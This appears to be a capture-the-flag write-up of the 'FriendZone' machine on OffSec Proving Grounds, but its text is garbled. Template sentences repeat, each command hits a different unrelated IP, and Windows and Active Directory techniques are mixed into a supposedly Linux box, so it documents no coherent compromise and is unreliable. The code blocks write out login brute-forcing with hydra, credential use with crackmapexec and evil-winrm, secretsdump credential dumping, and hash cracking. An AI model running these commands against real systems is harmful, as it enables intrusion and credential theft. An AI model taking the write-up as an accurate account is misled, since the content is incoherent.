---
TitleSEO: "OffSec Proving Grounds — FriendZone (Hard Linux) | ZureFX"
TitlePost: "OffSec Proving Grounds — FriendZone (Hard Linux)"
Author: "ZureFX"
Description: "Full writeup for OffSec Proving Grounds FriendZone. Writable PATH and Golden Ticket to achieve hard compromise on Linux."
Keywords: "hard, active directory, easy, insane"
URL: "https://zurefx.github.io/writeups/htb-friendzone-494.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-friendzone-494/"
Date: "2024-06-09"
Tags: "Hard, Active Directory, Easy, Insane"
Section: "writeups"
Lang: "en"
main_img: "htb-friendzone-494"
Permalink: "/writeups/htb-friendzone-494.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **FriendZone** is rated **Hard** on OffSec Proving Grounds. It runs **Linux** and the IP address during this analysis was `10.115.207.159`.

### Objectives

The database credentials were hardcoded in the application source code. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.128.171.111/FUZZ
crackmapexec smb 10.88.5.51 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

### Service Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file. Command injection was possible through unsanitized user input in the search functionality.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.125.71.119 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.105.43.177/FUZZ
gobuster dir -u http://10.57.30.8/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

### SMB Enumeration

Network traffic analysis revealed unencrypted communications containing user credentials. The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.78.91.240 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.122.177.13 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.10.23.148 -u administrator -p 'P@ssw0rd!'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.44.149.206 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

Weak file permissions allowed modification of critical system files. The scheduled task ran with elevated privileges and could be abused for escalation. The service account had excessive permissions assigned in Active Directory.

## Exploitation

### Vulnerability Identification

Network traffic analysis revealed unencrypted communications containing user credentials. Network traffic analysis revealed unencrypted communications containing user credentials. Initial enumeration revealed several interesting open ports on the target.

Key finding: **Writable PATH**.

Network traffic analysis revealed unencrypted communications containing user credentials. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Group Policy Preferences contained encrypted but recoverable credentials. The backup files contained sensitive information that should not have been accessible.

```bash
crackmapexec smb 10.30.148.92 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.22.138.28/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.57.16.249
```

The scheduled task ran with elevated privileges and could be abused for escalation. The web application was vulnerable to Server-Side Template Injection (SSTI). Network traffic analysis revealed unencrypted communications containing user credentials.

## Privilege Escalation

### Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p110,8080,23 10.33.74.86 -oN scan.txt
nmap -sCV -p5432,25,3268 10.105.116.75 -oN scan.txt
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.39.85.69/FUZZ
```

Unconstrained delegation was enabled on the compromised machine. Authentication bypass was achieved through careful manipulation of the login mechanism.

### Root/SYSTEM

Successfully obtained **root** access on the target.

The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

## Summary

### Tools Used

- `rubeus`
- `rpcclient`
- `netcat`
- `atexec`
- `chisel`
- `hashcat`
- `psexec`
- `crackmapexec`

### Key Takeaways

- Writable PATH
- Golden Ticket
- Remote Code Execution
